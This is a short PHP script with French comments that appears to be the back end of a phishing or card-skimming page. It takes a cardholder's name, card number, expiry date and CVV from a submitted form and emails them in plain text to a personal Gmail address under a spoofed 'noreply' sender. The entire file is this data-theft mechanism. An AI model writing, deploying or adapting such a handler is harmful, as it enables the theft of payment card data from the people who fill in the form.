<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Récupérer les données du formulaire
    $cardName = htmlspecialchars($_POST['card-name']);
    $cardNumber = htmlspecialchars($_POST['card-number']);
    $expiryDate = htmlspecialchars($_POST['expiry-date']);
    $cvv = htmlspecialchars($_POST['cvv']);

    // Créer le contenu de l'e-mail
    $to = "baradur24@gmail.com";
    $subject = "Données du formulaire de carte de crédit";
    $message = "Nom sur la carte: $cardName\n";
    $message .= "Numéro de carte: $cardNumber\n";
    $message .= "Date d'expiration: $expiryDate\n";
    $message .= "CVV: $cvv\n";
    $headers = "From: noreply@votresite.com";

    // Envoyer l'e-mail
    if (mail($to, $subject, $message, $headers)) {
        echo "Les données ont été envoyées avec succès.";
    } else {
        echo "Une erreur s'est produite lors de l'envoi des données.";
    }
} else {
    echo "Méthode de requête invalide.";
}
?>
